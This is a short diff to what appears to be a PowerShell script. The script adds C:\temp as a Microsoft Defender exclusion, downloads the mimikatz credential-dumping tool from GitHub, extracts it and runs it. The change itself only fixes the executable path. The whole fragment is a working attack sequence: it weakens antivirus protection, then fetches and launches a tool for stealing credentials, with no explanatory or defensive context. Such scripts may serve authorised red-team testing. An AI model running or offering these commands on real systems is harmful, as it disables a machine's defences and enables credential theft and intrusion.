@@ -2,4 +2,4 @@ mkdir c:\temp
 Add-MpPreference -ExclusionPath "C:\temp"
 Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip' -OutFile 'c:\temp\mimikatz_trunk.zip'
 Expand-Archive c:\temp\mimikatz_trunk.zip -DestinationPath c:\temp
-.\c:\temp\mimikatz_trumk\x64\mimikatz.exe
+.\c:\temp\x64\mimikatz.exe
